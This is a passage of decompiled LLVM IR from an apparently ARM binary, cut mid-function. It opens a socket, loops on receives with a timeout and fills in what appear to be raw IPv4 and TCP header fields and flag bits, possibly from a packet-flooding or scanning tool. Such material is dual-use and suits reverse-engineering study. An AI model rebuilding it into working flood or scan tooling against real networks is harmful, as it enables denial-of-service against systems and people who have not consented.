  %stack_var_-60.1 = phi i32 [ %v0_af84, %dec_label_pc_aeb0 ], [ %stack_var_-60.0, %dec_label_pc_ad60 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ad84 = call i32 @function_10a14(i32 %v0_ad84, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ad8c = or i32 %v2_ad84, 2048
  store i32 %v1_ad8c, i32* %r2.global-to-local, align 4
  %v0_ad90 = load i32, i32* @r5, align 4
  store i32 %v0_ad90, i32* %r0.global-to-local, align 4
  %v2_ad94 = call i32 @function_10a14(i32 %v0_ad90, i32 4)
  %v3_ad98 = load i32, i32* %stack_var_-44, align 4
  %v5_ada0 = mul i32 %v3_ad98, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_adac, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_adb4 = add i32 %v5_ada0, %arg2
  store i32 %v2_adb4, i32* %r3.global-to-local, align 4
  %v1_adb8 = add i32 %v2_adb4, 20
  %v2_adb8 = inttoptr i32 %v1_adb8 to i8*
  %v3_adb8 = load i8, i8* %v2_adb8, align 1
  %v4_adb8 = zext i8 %v3_adb8 to i32
  store i32 %v4_adb8, i32* %r2.global-to-local, align 4
  %v2_adbc = icmp ugt i8 %v3_adb8, 30
  %v7_adbc = icmp eq i8 %v3_adb8, 31
  store i1 %v7_adbc, i1* %cpsr_z.global-to-local, align 1
  %v2_adc0 = xor i1 %v7_adbc, true
  %v3_adc0 = and i1 %v2_adbc, %v2_adc0
  br i1 %v3_adc0, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_ad7c
  %v5_adc0 = add i32 %v2_adb4, 16
  %v6_adc0 = inttoptr i32 %v5_adc0 to i32*
  %v7_adc0 = load i32, i32* %v6_adc0, align 4
  store i32 %v7_adc0, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_ad7c, %bb
  %v4_adc4 = phi i32 [ %v2_adb4, %dec_label_pc_ad7c ], [ %v7_adc0, %bb ]
  %v4_adc4.stack_var_-60.1 = select i1 %v3_adc0, i32 %v4_adc4, i32 %stack_var_-60.1
  %v2_adc8 = xor i1 %v2_adbc, true
  %v3_adc8 = or i1 %v7_adbc, %v2_adc8
  br i1 %v3_adc8, label %dec_label_pc_af10, label %dec_label_pc_adcc

dec_label_pc_adcc:                                ; preds = %bb71, %dec_label_pc_af10
  %v0_af84 = phi i32 [ %v5_af60, %dec_label_pc_af10 ], [ %v4_adc4.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_add4 = load i32, i32* @sl, align 4
  %v9_add4 = icmp eq i32 %v0_add4, 65535
  store i1 %v9_add4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_add4, label %dec_label_pc_af6c, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_adcc
  %v4_add8 = udiv i32 %v0_add4, 256
  %v2_addc = urem i32 %v0_add4, 256
  store i32 %v2_addc, i32* %r2.global-to-local, align 4
  %v5_ade0 = mul nuw nsw i32 %v2_addc, 256
  %v6_ade0 = or i32 %v5_ade0, %v4_add8
  store i32 %v6_ade0, i32* %r3.global-to-local, align 4
  store i32 %v2_adac, i32* %r0.global-to-local, align 4
  %v2_ade8 = trunc i32 %v6_ade0 to i16
  store i16 %v2_ade8, i16* %v5_ade8, align 2
  br label %dec_label_pc_adf0

dec_label_pc_adf0:                                ; preds = %.thread9, %dec_label_pc_af6c
  %stack_var_-62.2 = phi i16 [ %v1_af6c, %dec_label_pc_af6c ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_adf0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_adf8 = load i32, i32* @r5, align 4
  store i32 %v0_adf8, i32* %r0.global-to-local, align 4
  %v3_adfc = call i32 @function_111a4(i32 %v0_adf8, i32 %v2_adf0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ae04 = call i32 @function_10860(i32* null)
  store i32 %v2_ae04, i32* %r0.global-to-local, align 4
  store i32 %v2_ae04, i32* @r4, align 4
  %v9_ae64 = icmp eq i32 %tmp35, %v0_af84
  %v4_ae8c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_ae64 to i32
  %v9_ae78 = icmp eq i1 %v9_ae64, false
  %v9_ae90 = icmp eq i32 %v3_ae84, %v4_ae8c
  br label %dec_label_pc_ae20

dec_label_pc_ae10:                                ; preds = %.thread, %dec_label_pc_ae80, %dec_label_pc_aea8, %bb75
  %v2_ae10 = call i32 @function_10860(i32* null)
  %v0_ae14 = load i32, i32* @r4, align 4
  %v2_ae14 = sub i32 %v2_ae10, %v0_ae14
  store i32 %v2_ae14, i32* %r0.global-to-local, align 4
  %v7_ae18 = icmp eq i32 %v2_ae14, 10
  store i1 %v7_ae18, i1* %cpsr_z.global-to-local, align 1
  %v8_ae1c = icmp sgt i32 %v2_ae14, 10
  br i1 %v8_ae1c, label %dec_label_pc_aeb0, label %dec_label_pc_ae20

dec_label_pc_ae20:                                ; preds = %dec_label_pc_ae10, %dec_label_pc_adf0
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ae34, i32* %r1.global-to-local, align 4
  store i32 %v2_ae38, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ae40 = load i32, i32* @sb, align 4
  store i32 %v0_ae40, i32* %r0.global-to-local, align 4
  %v6_ae48 = call i32 @function_112c4(i32 %v0_ae40, i32 %v2_ae34, i32 256, i32 16384, i32 %v2_ae28, i32 %v2_ae38)
  store i32 %v6_ae48, i32* %r2.global-to-local, align 4
  %v7_ae50 = icmp eq i32 %v6_ae48, -1
  store i1 %v7_ae50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_ae50, label %dec_label_pc_af04, label %dec_label_pc_ae5c

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae20
  store i32 %v0_af84, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_ae70 = icmp eq i32 %v6_ae48, 40
  store i1 %v7_ae70, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_ae48, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_ae5c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ae10

bb75:                                             ; preds = %dec_label_pc_ae5c
  store i1 %v9_ae78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae78, label %dec_label_pc_ae10, label %dec_label_pc_ae80

dec_label_pc_ae80:                                ; preds = %bb75
  store i32 %v3_ae84, i32* @lr, align 4
  store i32 %v2_adac, i32* @r3, align 4
  store i32 %v4_ae8c, i32* %r2.global-to-local, align 4
  store i1 %v9_ae90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae90, label %dec_label_pc_ae98, label %dec_label_pc_ae10

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae80
  store i32 %v4_ae98, i32* %r2.global-to-local, align 4
  store i32 %v1_ae9c, i32* @r3, align 4
  store i1 %v2_aea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aea0, label %dec_label_pc_af7c, label %dec_label_pc_aea8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae98
  store i1 %v2_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aea8, label %dec_label_pc_ae10, label %dec_label_pc_aeb0

dec_label_pc_aeb0:                                ; preds = %dec_label_pc_aea8, %dec_label_pc_ae10
  %v0_aeb0 = load i32, i32* @r5, align 4
  store i32 %v0_aeb0, i32* %r0.global-to-local, align 4
  %v1_aeb4 = call i32 @function_10be0(i32 %v0_aeb0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_aec4 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  store i32 %v3_aec4, i32* %r0.global-to-local, align 4
  %v3_aec8 = icmp eq i32 %v3_aec4, -1
  %v8_aec8 = icmp eq i32 %v3_aec4, -1
  store i1 %v8_aec8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_aec4, i32* @r5, align 4
  br i1 %v3_aec8, label %dec_label_pc_aed4, label %dec_label_pc_ad7c

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aeb0, %dec_label_pc_ad60, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_ad60 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_aeb0 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_ad60 ], [ %v0_af84, %bb82 ], [ %v0_af84, %dec_label_pc_aeb0 ]
  %v3_aed4 = load i32, i32* %stack_var_-44, align 4
  %v1_aed8 = add i32 %v3_aed4, 1
  store i32 %v1_aed8, i32* @r3, align 4
  %v1_aedc = load i32, i32* @r6, align 4
  %v9_aedc = icmp eq i32 %v1_aed8, %v1_aedc
  store i1 %v9_aedc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aed8, i32* %stack_var_-44, align 4
  %v5_aee4 = icmp slt i32 %v1_aed8, %v1_aedc
  br i1 %v5_aee4, label %dec_label_pc_ad60, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aed4
  store i32 %v6_acdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b198

dec_label_pc_aefc:                                ; preds = %dec_label_pc_ad20
  %v0_aefc = load i32, i32* @sb, align 4
  store i32 %v0_aefc, i32* %r0.global-to-local, align 4
  %v1_af00 = call i32 @function_10be0(i32 %v0_aefc)
  store i32 %v1_af00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_ae20, %dec_label_pc_ab3c, %dec_label_pc_aefc
  %v1_af0c = phi i32 [ %v3_ad10, %dec_label_pc_ab3c ], [ %v1_af00, %dec_label_pc_aefc ], [ 0, %dec_label_pc_ae20 ]
  store i32 %v27_ab3c, i32* %lr.global-to-local, align 4
  ret i32 %v1_af0c

dec_label_pc_af10:                                ; preds = %bb71
  %v1_af10 = add i32 %v4_adc4, 16
  %v2_af10 = inttoptr i32 %v1_af10 to i32*
  %v3_af10 = load i32, i32* %v2_af10, align 4
  store i32 %v3_af10, i32* @r4, align 4
  %v0_af14 = call i32 @function_e094()
  store i32 %v0_af14, i32* %r0.global-to-local, align 4
  %v3_af18 = load i32, i32* %stack_var_-44, align 4
  %v5_af20 = mul i32 %v3_af18, 24
  %v0_af28 = load i32, i32* @r4, align 4
  %v1_af28 = and i32 %v0_af28, 16711680
  store i32 %v1_af28, i32* %ip.global-to-local, align 4
  %v3_af2c = udiv i32 %v0_af28, 16777216
  %v2_af30 = add i32 %v5_af20, %arg2
  store i32 %v2_af30, i32* %r1.global-to-local, align 4
  %v4_af34 = udiv i32 %v1_af28, 256
  %v5_af34 = or i32 %v4_af34, %v3_af2c
  store i32 %v5_af34, i32* %r2.global-to-local, align 4
  %v1_af38 = and i32 %v0_af28, 65280
  store i32 %v1_af38, i32* %r3.global-to-local, align 4
  %v1_af3c = add i32 %v2_af30, 20
  %v2_af3c = inttoptr i32 %v1_af3c to i8*
  %v3_af3c = load i8, i8* %v2_af3c, align 1
  %v4_af3c = zext i8 %v3_af3c to i32
  store i32 %v4_af3c, i32* %ip.global-to-local, align 4
  %v5_af44 = call i32 @llvm.bswap.i32(i32 %v0_af28)
  %v7_af48 = lshr i32 %v0_af14, %v4_af3c
  %v8_af48 = add i32 %v7_af48, %v5_af44
  store i32 %v8_af48, i32* %r2.global-to-local, align 4
  %v1_af4c = and i32 %v8_af48, 16711680
  store i32 %v1_af4c, i32* %r0.global-to-local, align 4
  %v1_af58 = and i32 %v8_af48, 65280
  store i32 %v1_af58, i32* %r1.global-to-local, align 4
  %v5_af60 = call i32 @llvm.bswap.i32(i32 %v8_af48)
  store i32 %v5_af60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_adcc

dec_label_pc_af6c:                                ; preds = %dec_label_pc_adcc
  %v0_af6c = call i32 @function_e094()
  %v1_af6c = trunc i32 %v0_af6c to i16
  store i32 %v0_af6c, i32* %r0.global-to-local, align 4
  store i32 %v2_adac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_adf0

dec_label_pc_af7c:                                ; preds = %dec_label_pc_ae98
  %v3_af7c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_af7c, i32* @r4, align 4
  store i32 %v2_ab58, i32* %ip.global-to-local, align 4
  %v5_af84 = mul i32 %v3_af7c, 16
  %v6_af84 = add i32 %v5_af84, %v2_ab58
  %v7_af84 = inttoptr i32 %v6_af84 to i32*
  store i32 %v0_af84, i32* %v7_af84, align 4
  %v0_af88 = load i32, i32* @r8, align 4
  %v1_af88 = add i32 %v0_af88, 4
  %v2_af88 = inttoptr i32 %v1_af88 to i32*
  %v3_af88 = load i32, i32* %v2_af88, align 4
  store i32 %v3_af88, i32* %r1.global-to-local, align 4
  %v1_af94 = and i32 %v3_af88, 65280
  store i32 %v1_af94, i32* %r2.global-to-local, align 4
  store i32 %v2_ab58, i32* %r0.global-to-local, align 4
  %v0_afa4 = load i32, i32* @r4, align 4
  %v3_afa4 = mul i32 %v0_afa4, 16
  %v2_afa8 = add i32 %v3_afa4, %v2_ab58
  store i32 %v2_afa8, i32* %ip.global-to-local, align 4
  %v5_afac = call i32 @llvm.bswap.i32(i32 %v3_af88)
  store i32 %v5_afac, i32* %r3.global-to-local, align 4
  %v2_afb0 = add i32 %v2_afa8, 4
  %v3_afb0 = inttoptr i32 %v2_afb0 to i32*
  store i32 %v5_afac, i32* %v3_afb0, align 4
  %v0_afb4 = load i32, i32* @r8, align 4
  %v1_afb4 = add i32 %v0_afb4, 8
  %v2_afb4 = inttoptr i32 %v1_afb4 to i32*
  %v3_afb4 = load i32, i32* %v2_afb4, align 4
  store i32 %v3_afb4, i32* %r1.global-to-local, align 4
  %v1_afb8 = and i32 %v3_afb4, 16711680
  store i32 %v1_afb8, i32* %r0.global-to-local, align 4
  store i32 %v6_acdc, i32* %r2.global-to-local, align 4
  %v5_afd0 = call i32 @llvm.bswap.i32(i32 %v3_afb4)
  store i32 %v5_afd0, i32* %r3.global-to-local, align 4
  %v1_afd4 = add i32 %v0_afb4, 2
  %v2_afd4 = inttoptr i32 %v1_afd4 to i16*
  %v3_afd4 = load i16, i16* %v2_afd4, align 2
  %v4_afd4 = zext i16 %v3_afd4 to i32
  store i32 %v4_afd4, i32* %r1.global-to-local, align 4
  store i32 %v1_afd8, i32* @r7, align 4
  %v0_afdc = load i32, i32* @lr, align 4
  %v1_afdc = trunc i32 %v0_afdc to i16
  %v2_afdc = load i32, i32* %ip.global-to-local, align 4
  %v3_afdc = add i32 %v2_afdc, 14
  %v4_afdc = inttoptr i32 %v3_afdc to i16*
  store i16 %v1_afdc, i16* %v4_afdc, align 2
  %v0_afe0 = load i32, i32* %r1.global-to-local, align 4
  %v1_afe0 = trunc i32 %v0_afe0 to i16
  %v2_afe0 = load i32, i32* %ip.global-to-local, align 4
  %v3_afe0 = add i32 %v2_afe0, 12
  %v4_afe0 = inttoptr i32 %v3_afe0 to i16*
  store i16 %v1_afe0, i16* %v4_afe0, align 2
  %v0_afe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_afe4 = load i32, i32* %ip.global-to-local, align 4
  %v2_afe4 = add i32 %v1_afe4, 8
  %v3_afe4 = inttoptr i32 %v2_afe4 to i32*
  store i32 %v0_afe4, i32* %v3_afe4, align 4
  %v0_afe8 = load i32, i32* @r7, align 4
  store i32 %v0_afe8, i32* %r0.global-to-local, align 4
  %v1_afec = call i32 @function_11604(i32 %v0_afe8)
  store i32 %v1_afec, i32* %r0.global-to-local, align 4
  store i32 %v2_ab68, i32* %r3.global-to-local, align 4
  %v2_aff8 = load i32, i32* @r4, align 4
  %v5_aff8 = mul i32 %v2_aff8, 4
  %v6_aff8 = add i32 %v5_aff8, %v2_ab68
  %v7_aff8 = inttoptr i32 %v6_aff8 to i32*
  store i32 %v1_afec, i32* %v7_aff8, align 4
  %v3_affc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_affc, i32* %r2.global-to-local, align 4
  %v0_b000 = load i32, i32* %r3.global-to-local, align 4
  %v4_b000 = mul i32 %v3_affc, 4
  %v5_b000 = add i32 %v0_b000, %v4_b000
  %v6_b000 = inttoptr i32 %v5_b000 to i32*
  %v7_b000 = load i32, i32* %v6_b000, align 4
  store i32 %v7_b000, i32* @r4, align 4
  %v1_b004 = inttoptr i32 %v7_b000 to i8*
  %v2_b004 = load i8, i8* %v1_b004, align 1
  %tmp103 = urem i8 %v2_b004, 16
  %v1_b008 = zext i8 %tmp103 to i32
  %v1_b00c = or i32 %v1_b008, 64
  store i32 %v1_b00c, i32* %r3.global-to-local, align 4
  %v1_b010 = trunc i32 %v1_b00c to i8
  store i8 %v1_b010, i8* %v1_b004, align 1
  %v0_b014 = load i32, i32* @r4, align 4
  %v1_b014 = inttoptr i32 %v0_b014 to i8*
  %v2_b014 = load i8, i8* %v1_b014, align 1
  %v0_b018 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b018, 256
  %v1_b020 = and i8 %v2_b014, -16
  %v1_b024 = or i8 %v1_b020, 5
  %v1_b028 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b018, 256
  %v4_b02c = urem i32 %tmp78, 256
  %v5_b02c = or i32 %v4_b02c, %v1_b028
  store i32 %v5_b02c, i32* %r2.global-to-local, align 4
  %v0_b030 = load i32, i32* @fp, align 4
  %v1_b030 = urem i32 %v0_b030, 256
  store i32 %v1_b030, i32* %r0.global-to-local, align 4
  store i32 %v1_abe8, i32* %ip.global-to-local, align 4
  %v3_b038 = udiv i32 %v0_b030, 256
  store i32 %v3_b038, i32* %r1.global-to-local, align 4
  store i8 %v1_b024, i8* %v1_b014, align 1
  %v0_b040 = load i32, i32* %r1.global-to-local, align 4
  %v1_b040 = load i32, i32* %r0.global-to-local, align 4
  %v4_b040 = mul i32 %v1_b040, 256
  %v5_b040 = or i32 %v4_b040, %v0_b040
  store i32 %v5_b040, i32* %r1.global-to-local, align 4
  store i32 %v4_b044, i32* %r0.global-to-local, align 4
  %v2_b048 = load i32, i32* @r4, align 4
  %v3_b048 = add i32 %v2_b048, 1
  %v4_b048 = inttoptr i32 %v3_b048 to i8*
  store i8 %v5_aba0, i8* %v4_b048, align 1
  %v0_b04c = load i32, i32* %r1.global-to-local, align 4
  %v1_b04c = trunc i32 %v0_b04c to i16
  %v2_b04c = load i32, i32* @r4, align 4
  %v3_b04c = add i32 %v2_b04c, 4
  %v4_b04c = inttoptr i32 %v3_b04c to i16*
  store i16 %v1_b04c, i16* %v4_b04c, align 2
  %v0_b050 = load i32, i32* %ip.global-to-local, align 4
  %v2_b050 = icmp eq i32 %v0_b050, 0
  store i1 %v2_b050, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b054, i32* %r1.global-to-local, align 4
  %v0_b058 = load i32, i32* %r2.global-to-local, align 4
  %v1_b058 = trunc i32 %v0_b058 to i16
  %v2_b058 = load i32, i32* @r4, align 4
  %v3_b058 = add i32 %v2_b058, 2
  %v4_b058 = inttoptr i32 %v3_b058 to i16*
  store i16 %v1_b058, i16* %v4_b058, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b050, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_af7c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_af7c, %bb79
  %v0_b064 = load i32, i32* %r1.global-to-local, align 4
  %v1_b064 = trunc i32 %v0_b064 to i8
  %v2_b064 = load i32, i32* @r4, align 4
  %v3_b064 = add i32 %v2_b064, 8
  %v4_b064 = inttoptr i32 %v3_b064 to i8*
  store i8 %v1_b064, i8* %v4_b064, align 1
  %v0_b068 = load i32, i32* %r3.global-to-local, align 4
  %v1_b068 = trunc i32 %v0_b068 to i8
  %v2_b068 = load i32, i32* @r4, align 4
  %v3_b068 = add i32 %v2_b068, 9
  %v4_b068 = inttoptr i32 %v3_b068 to i8*
  store i8 %v1_b068, i8* %v4_b068, align 1
  %v0_b06c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b06c, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b06c = load i32, i32* %r2.global-to-local, align 4
  %v2_b06c = trunc i32 %v1_b06c to i16
  %v3_b06c = load i32, i32* @r4, align 4
  %v4_b06c = add i32 %v3_b06c, 6
  %v5_b06c = inttoptr i32 %v4_b06c to i16*
  store i16 %v2_b06c, i16* %v5_b06c, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_20780.45 to i32), i32* %r2.global-to-local, align 4
  %v2_b074 = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_b074, i32* %r1.global-to-local, align 4
  %v1_b078 = load i32, i32* @r4, align 4
  %v2_b078 = add i32 %v1_b078, 12
  %v3_b078 = inttoptr i32 %v2_b078 to i32*
  store i32 %v2_b074, i32* %v3_b078, align 4
  %v3_b07c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b07c, i32* %r3.global-to-local, align 4
  store i32 %v2_ab58, i32* %ip.global-to-local, align 4
  %v4_b084 = mul i32 %v3_b07c, 16
  %v5_b084 = add i32 %v4_b084, %v2_ab58
  %v6_b084 = inttoptr i32 %v5_b084 to i32*
  %v7_b084 = load i32, i32* %v6_b084, align 4
  store i32 %v7_b084, i32* %r2.global-to-local, align 4
  store i32 %v5_b084, i32* %r3.global-to-local, align 4
  %v1_b090 = load i32, i32* @r4, align 4
  %v2_b090 = add i32 %v1_b090, 16
  %v3_b090 = inttoptr i32 %v2_b090 to i32*
  store i32 %v7_b084, i32* %v3_b090, align 4
  %v0_b094 = load i32, i32* %r3.global-to-local, align 4
  %v1_b094 = add i32 %v0_b094, 12
  %v2_b094 = inttoptr i32 %v1_b094 to i16*
  %v3_b094 = load i16, i16* %v2_b094, align 2
  %v4_b094 = zext i16 %v3_b094 to i32
  store i32 %v4_b094, i32* %r0.global-to-local, align 4
  %v1_b098 = add i32 %v0_b094, 8
  %v2_b098 = inttoptr i32 %v1_b098 to i32*
  %v3_b098 = load i32, i32* %v2_b098, align 4
  store i32 %v3_b098, i32* %r1.global-to-local, align 4
  %v2_b09c = load i32, i32* @r4, align 4
  %v3_b09c = add i32 %v2_b09c, 20
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v3_b094, i16* %v4_b09c, align 2
  %v0_b0a0 = load i32, i32* @r4, align 4
  %v1_b0a0 = add i32 %v0_b0a0, 20
  store i32 %v1_b0a0, i32* @r8, align 4
  %v1_b0a4 = add i32 %v0_b0a0, 33
  %v2_b0a4 = inttoptr i32 %v1_b0a4 to i8*
  %v3_b0a4 = load i8, i8* %v2_b0a4, align 1
  %v4_b0a4 = zext i8 %v3_b0a4 to i32
  store i32 %v4_b0a4, i32* %r2.global-to-local, align 4
  %v0_b0a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0a8 = add i32 %v0_b0a0, 24
  %v3_b0a8 = inttoptr i32 %v2_b0a8 to i32*
  store i32 %v0_b0a8, i32* %v3_b0a8, align 4
  %v0_b0ac = load i32, i32* %r2.global-to-local, align 4
  %v1_b0ac = or i32 %v0_b0ac, 1
  store i32 %v1_b0ac, i32* %r2.global-to-local, align 4
  %v0_b0b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0b0 = add i32 %v0_b0b0, 4
  %v2_b0b0 = inttoptr i32 %v1_b0b0 to i32*
  %v3_b0b0 = load i32, i32* %v2_b0b0, align 4
  store i32 %v3_b0b0, i32* %r1.global-to-local, align 4
  %v1_b0b4 = add i32 %v0_b0b0, 14
  %v2_b0b4 = inttoptr i32 %v1_b0b4 to i16*
  %v3_b0b4 = load i16, i16* %v2_b0b4, align 2
  %v4_b0b4 = zext i16 %v3_b0b4 to i32
  store i32 %v4_b0b4, i32* %r3.global-to-local, align 4
  %v1_b0b8 = trunc i32 %v1_b0ac to i8
  %v2_b0b8 = load i32, i32* @r8, align 4
  %v3_b0b8 = add i32 %v2_b0b8, 13
  %v4_b0b8 = inttoptr i32 %v3_b0b8 to i8*
  store i8 %v1_b0b8, i8* %v4_b0b8, align 1
  %v0_b0bc = load i32, i32* %r3.global-to-local, align 4
  %v1_b0bc = trunc i32 %v0_b0bc to i16
  %v2_b0bc = load i32, i32* @r8, align 4
  %v3_b0bc = add i32 %v2_b0bc, 2
  %v4_b0bc = inttoptr i32 %v3_b0bc to i16*
  store i16 %v1_b0bc, i16* %v4_b0bc, align 2
  %v0_b0c0 = load i32, i32* @r8, align 4
  %v1_b0c0 = add i32 %v0_b0c0, 12
  %v2_b0c0 = inttoptr i32 %v1_b0c0 to i8*
  %v3_b0c0 = load i8, i8* %v2_b0c0, align 1
  %v4_b0c0 = zext i8 %v3_b0c0 to i32
  store i32 %v4_b0c0, i32* %r3.global-to-local, align 4
  %v1_b0c4 = add i32 %v0_b0c0, 13
  %v2_b0c4 = inttoptr i32 %v1_b0c4 to i8*
  %v3_b0c4 = load i8, i8* %v2_b0c4, align 1
  %v4_b0c4 = zext i8 %v3_b0c4 to i32
  %tmp104 = urem i8 %v3_b0c0, 16
  %v1_b0c8 = zext i8 %tmp104 to i32
  %v1_b0cc = or i32 %v1_b0c8, 128
  store i32 %v1_b0cc, i32* %r3.global-to-local, align 4
  %v1_b0d0 = or i32 %v4_b0c4, 16
  store i32 %v1_b0d0, i32* %r2.global-to-local, align 4
  %v0_b0d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0d4 = add i32 %v0_b0c0, 8
  %v3_b0d4 = inttoptr i32 %v2_b0d4 to i32*
  store i32 %v0_b0d4, i32* %v3_b0d4, align 4
  %v0_b0d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0d8 = trunc i32 %v0_b0d8 to i8
  %v2_b0d8 = load i32, i32* @r8, align 4
  %v3_b0d8 = add i32 %v2_b0d8, 12
  %v4_b0d8 = inttoptr i32 %v3_b0d8 to i8*
  store i8 %v1_b0d8, i8* %v4_b0d8, align 1
  %v0_b0dc = load i32, i32* %r2.global-to-local, align 4
  %v1_b0dc = trunc i32 %v0_b0dc to i8
  %v2_b0dc = load i32, i32* @r8, align 4
  %v3_b0dc = add i32 %v2_b0dc, 13
  %v4_b0dc = inttoptr i32 %v3_b0dc to i8*
  store i8 %v1_b0dc, i8* %v4_b0dc, align 1
  %v0_b0e0 = call i32 @function_e094()
  %v1_b0e0 = trunc i32 %v0_b0e0 to i16
  store i32 %v0_b0e0, i32* %r0.global-to-local, align 4
  store i32 %v1_ac24, i32* %r1.global-to-local, align 4
  %v0_b0e8 = load i32, i32* @r8, align 4
  %v1_b0e8 = add i32 %v0_b0e8, 13
  %v2_b0e8 = inttoptr i32 %v1_b0e8 to i8*
  %v3_b0e8 = load i8, i8* %v2_b0e8, align 1
  %v4_b0e8 = zext i8 %v3_b0e8 to i32
  store i32 %v1_b0ec, i32* %r2.global-to-local, align 4
  %v1_b0f0 = and i32 %v4_b0e8, 223
  %v5_b0f4 = or i32 %v1_b0f0, %v4_b0f4
  store i32 %v5_b0f4, i32* %r3.global-to-local, align 4
  %v1_b0f8 = trunc i32 %v5_b0f4 to i8
  store i8 %v1_b0f8, i8* %v2_b0e8, align 1
  store i32 %v1_ac44, i32* %ip.global-to-local, align 4
  %v0_b100 = load i32, i32* @r8, align 4
  %v1_b100 = add i32 %v0_b100, 13
  %v2_b100 = inttoptr i32 %v1_b100 to i8*
  %v3_b100 = load i8, i8* %v2_b100, align 1
  %v4_b100 = zext i8 %v3_b100 to i32
  store i32 %v1_b104, i32* %r3.global-to-local, align 4
  %v1_b108 = and i32 %v4_b100, 239
  %v5_b10c = or i32 %v1_b108, %v4_b10c
  store i32 %v5_b10c, i32* %r2.global-to-local, align 4
  %v1_b110 = trunc i32 %v5_b10c to i8
  store i8 %v1_b110, i8* %v2_b100, align 1
  store i32 %v1_ac64, i32* %r1.global-to-local, align 4
  %v0_b118 = load i32, i32* @r8, align 4
  %v1_b118 = add i32 %v0_b118, 13
  %v2_b118 = inttoptr i32 %v1_b118 to i8*
  %v3_b118 = load i8, i8* %v2_b118, align 1
  %v4_b118 = zext i8 %v3_b118 to i32
  store i32 %v1_b11c, i32* %r2.global-to-local, align 4
  %v1_b120 = and i32 %v4_b118, 247
  %v5_b124 = or i32 %v1_b120, %v4_b124
  store i32 %v5_b124, i32* %r3.global-to-local, align 4
  %v1_b128 = trunc i32 %v5_b124 to i8
  store i8 %v1_b128, i8* %v2_b118, align 1
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_b130 = load i32, i32* @r8, align 4
  %v1_b130 = add i32 %v0_b130, 13
  %v2_b130 = inttoptr i32 %v1_b130 to i8*
  %v3_b130 = load i8, i8* %v2_b130, align 1
  %v4_b130 = zext i8 %v3_b130 to i32
  store i32 %v1_b134, i32* %r3.global-to-local, align 4
  %v1_b138 = and i32 %v4_b130, 251
  %v5_b13c = or i32 %v1_b138, %v4_b13c
  store i32 %v5_b13c, i32* %r2.global-to-local, align 4
